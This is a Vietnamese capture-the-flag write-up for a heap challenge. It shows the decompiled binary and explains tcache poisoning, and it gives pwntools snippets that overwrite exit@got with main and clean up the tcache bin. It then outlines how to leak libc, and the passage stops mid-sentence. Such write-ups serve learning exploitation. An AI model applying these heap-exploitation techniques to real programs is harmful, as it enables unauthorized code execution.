# [Our Poisoned Cache - FPTU Hacking CTF 2022]

Checksec xem nó thế nào đã:
![image](https://user-images.githubusercontent.com/54637811/176064973-7838dab6-b41a-4afa-bac8-74be7196cbd1.png)

Trông khá hứa hẹn, còn đây là code của em nó sau khi dịch ngược:

```C
void main(EVP_PKEY_CTX *param_1) {
    undefined8 local_38;
    undefined8 *local_30;
    void *local_28;
    undefined8 *local_20;
    undefined8 *local_18;
    long *local_10;

    init(param_1);
    local_10 = (long *)malloc(0x40);
    local_18 = (undefined8 *)((ulong)local_10 & 0xfffffffffffff000);
    local_20 = local_18 + 0x4200;
    local_30 = (undefined8 *)0x0;
    local_38 = 0;
    malloc(0x10);
    free(local_10);
    printf("Heap base is: %p\n", local_18);
    printf("Stack address is: %p\n", &local_38);
    puts("You can write wherever you want inside the heap");
    puts("Where:");
    __isoc99_scanf("%p", &local_30);
    puts("What:");
    __isoc99_scanf("%p", &local_38);
    if ((local_18 <= local_30) && (local_30 < local_20)) {
        *local_30 = local_38;
    }
    if (((*local_10 == 0) && (local_18 <= (undefined8 *)local_10[1])) &&
        ((undefined8 *)local_10[1] < local_20))
    {
        local_28 = malloc(0x40);
        read(0, local_28, 0x30);
        exit(0);
    }
    exit(0);
}

void secret(void)

{
    char local_58[76];
    int local_c;

    puts("Do you trust me?");
    puts("Are you thinking this is it?");
    puts("Is this where you find my secret?");
    memset(local_58, 0, 0x40);
    local_c = open("./secret.txt", 0);
    read(local_c, local_58, 0x40);
    puts(local_58);
    close(local_c);
    return;
}
```

NÓ cho địa chỉ Heap và Stack, rồi nó cho Write Where What nhưng với điều kiện địa chỉ nằm trong Heap và Heap + 0x4200.

Để ý thì nó malloc 0x40 xong free ngay sau đó, để lại 1 freed chunk trong tcache bin. Nếu ta thay đổi con trỏ này thì lần malloc tiếp theo sẽ trả về con trỏ mới được ghi đè.

Mục tiêu đầu tiên cần nghĩ tới là để nó trỏ tới got để ghi đè exit@got bằng main.
```python
r.sendlineafter(b'Where:\n', hex(heap+0xa8).encode())
r.sendlineafter(b'What:\n', hex(bin.got['exit']).encode())
r.send(p64(bin.symbols['main']))
```
Ok ngon nghẻ, nhưng nếu lần 2 thì sẽ không được vì điều kiện này
```C
if (((*local_10 == 0) && (local_18 <= (undefined8 *)local_10[1])) &&
        ((undefined8 *)local_10[1] < local_20))
```

Khi ta malloc 0x40 để ghi đè ở bước trước thì nó sẽ để lại 1 số thứ linh tinh ở trên tcache bin
![image](https://user-images.githubusercontent.com/54637811/176068078-20484a51-7ab3-44d4-8e16-fb5f2ae0c801.png)
Như vậy lần malloc 0x40, free nó thì `*local_10 != 0`, không thỏa mãn điều kiện. Do đó ta cần dọn dẹp cái đống đó đi
```python
r.sendlineafter(b'Where:\n', hex(heap+0xa8).encode())
r.sendlineafter(b'What:\n', hex(heap+0x2a0).encode())
```
Ok các bước tiếp theo sẽ là ghi đè setvbuf@got thành puts@plt+6, ghi đè `_IO_2_1_stderr_` ở trên bss để nó trỏ tới chỗ nào đó có địa chỉ libc, thì chúng ta leak libc base. Dứt điểm bằng cách gh
